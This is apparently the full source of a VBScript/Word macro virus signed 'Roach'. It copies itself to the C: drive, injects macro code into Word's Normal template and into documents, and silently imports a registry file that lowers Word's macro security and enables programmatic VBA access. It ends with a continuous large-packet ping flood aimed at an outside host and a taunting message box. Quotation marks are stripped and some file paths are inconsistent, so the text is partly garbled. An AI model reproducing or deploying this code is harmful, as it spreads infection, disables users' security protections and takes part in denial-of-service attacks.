On Error Resume Next
spawn()
Sub spawn()
Set s = CreateObject(Scripting.FileSystemObject)
Set f = s.GetFile(WScript.scriptfullname)
f.Copy (c:\Road.vbs)
f.Copy (c:\folder\subfolder\...\Roach.vbs)
Word()
End Sub
Sub word()
norm =Sub document_close()
On Error Resume Next
Open c:\Roach.txt For Output As 2
Print #2, sub document_open()
Print #2, On Error Resume Next
Print #2, a.v_Killer
Print #2, obj = ActiveDocument.Shapes(1).OLEFormat.ClassType
Print #2, With ActiveDocument.Shapes(1).OLEFormat
Print #2,     .ActivateAs ClassType:=obj
Print #2, .Activate
Print #2, End With
Print #2, end sub
Close 2
Set fso = CreateObject(Scripting.FileSystemObject)
Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile(c:\Roach.txt, 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
ActiveDocument.Shapes.AddOLEObject
FileName:=c:\Roach.vbs,
LinkToFile:=False
ActiveDocument.Save
Open c:\Road.reg
Print #3, REGEDIT4
Print #3, [HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]
Print #3, Level=dword:00000001
Print #3, ; [HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]
Print #3, Level=dword:00000001
Print #3, AccessVBOM=dword:00000001

Close 3
Shell regedit /s c:\Roach.reg, vbHide
Kill c:\Roach.reg
End Sub
Set fso = CreateObject(Scripting.FileSystemObject)
Set f = fso.createtextfile(c:\Roach.txt)
f.write norm
f.Close
Set oword = CreateObject(word.Application)
oword.Visible = False
Set nt = oword.NormalTemplate.VBProject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile(c:\Roach.txt, 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
Dos()
End Sub
Sub Dos()
Dim a
Set a = CreateObject(WScript.Shell)
a.run (c:\windows\ping.exe -t -l 100000 roach.freewebsitehosting.com)
End Sub
msgbox ur suffering from virus, ,coded by Roach my real name